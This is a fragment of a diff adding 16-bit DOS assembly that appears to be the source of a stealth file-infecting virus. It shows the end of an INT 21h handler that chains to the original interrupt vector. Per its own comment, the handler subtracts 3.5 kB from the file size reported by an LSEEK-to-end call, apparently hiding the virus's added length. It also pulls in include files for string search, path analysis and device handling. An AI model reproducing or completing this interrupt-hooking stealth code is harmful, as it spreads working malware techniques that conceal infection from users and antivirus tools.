+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  dec bx
+	  push ds
+	  mov ds,bx
+	  mov si,08h
+	  call FINDSTR
+	  pop ds
+	  jnc SSSRE
+;---------------------
+	  mov ax,word ptr cs:[STEASZAX-START]  ; LSEEK end -3,5kB.
+	  mov dx,word ptr cs:[STEASZDX-START]  
+	  cmp ax,0e00h
+	  jz SSS1
+	  jc SSS3
+	  sub ax,0e00h
+	  jmp SSS2
+
+SSS3:     dec dx
+	  mov cx,0ffffh
+	  mov bx,0e00h
+	  sub bx,ax
+	  sub cx,bx
+	  inc cx
+	  mov ax,cx
+	  jmp SSS2
+SSS1:     mov ax,0h
+SSS2:     mov word ptr cs:[STEASZAX-START],ax
+	  mov word ptr cs:[STEASZDX-START],dx
+;---------------------
+SSSRE:    pop ds
+	  pop es
+	  popa
+	  popf
+	  mov ax,word ptr cs:[STEASZAX-START]
+	  mov dx,word ptr cs:[STEASZDX-START]
+FLEG4:    sti
+SSSE:     retf 0002h
+;-------------------------------------------------------------------------
+;-------------------------------------------------------------------------
+SIENDCE:  popf
+	  jmp dword ptr cs:[HPVECT21-START]
+;-------------------------------------------------------------------------
+TRACE1:   mov cx,10d
+TRACE2:   dec cx
+	  jnz TRACE2
+	  jmp AAAY
+;***************************************************************************
+include FINDSTR.inc
+include ANLPATH.inc
+include MDEVICE.inc
+include TXT.inc
+END
